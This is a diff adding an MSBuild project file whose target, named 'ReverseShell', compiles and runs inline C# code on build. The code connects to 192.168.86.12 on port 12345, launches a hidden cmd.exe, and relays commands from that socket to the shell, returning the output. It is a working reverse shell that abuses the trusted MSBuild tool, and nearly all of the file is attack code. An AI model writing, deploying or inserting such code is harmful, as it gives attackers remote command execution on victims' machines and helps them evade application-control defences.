@@ -1,0 +1,83 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+    <Target Name="ReverseShell">
+        <ClassExample />
+    </Target>
+    <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.Core.dll">
+        <Task>
+            <Using Namespace="System" />
+            <Using Namespace="System.IO" />
+            <Using Namespace="System.Diagnostics" />
+            <Using Namespace="System.Net.Sockets" />
+            <Code Type="Class" Language="cs">
+                <![CDATA[
+                using System;
+                using System.IO;
+                using System.Diagnostics;
+                using System.Net.Sockets;
+                using System.Text;
+
+                public class ClassExample : Microsoft.Build.Framework.ITask
+                {
+                    public Microsoft.Build.Framework.IBuildEngine BuildEngine { get; set; }
+                    public Microsoft.Build.Framework.ITaskHost HostObject { get; set; }
+
+                    public bool Execute()
+                    {
+                        string host = "192.168.86.12";
+                        int port = 12345;
+
+                        try
+                        {
+                            using (TcpClient client = new TcpClient(host, port))
+                            using (Stream stream = client.GetStream())
+                            using (StreamReader reader = new StreamReader(stream))
+                            using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true })
+                            {
+                                string shell = "cmd.exe";
+                                Process process = new Process
+                                {
+                                    StartInfo = new ProcessStartInfo
+                                    {
+                                        FileName = shell,
+                                        RedirectStandardInput = true,
+                                        RedirectStandardOutput = true,
+                                        RedirectStandardError = true,
+                                        UseShellExecute = false,
+                                        CreateNoWindow = true
+                                    }
+                                };
+
+                                process.Start();
+
+                                using (StreamWriter inputWriter = process.StandardInput)
+                                using (StreamReader outputReader = process.StandardOutput)
+                                using (StreamReader errorReader = process.StandardError)
+                                {
+                                    while (true)
+                                    {
+                                        string command = reader.ReadLine();
+                                        if (command == null || command.ToLower() == "exit") break;
+
+                                        inputWriter.WriteLine(command);
+                                        inputWriter.Flush();
+
+                                        string output = outputReader.ReadToEnd();
+                                        string error = errorReader.ReadToEnd();
+
+                                        writer.WriteLine(output + error);
+                                    }
+                                }
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine("Error: " + ex.Message);
+                        }
+                        return true;
+                    }
+                }
+                ]]>
+            </Code>
+        </Task>
+    </UsingTask>
+</Project>
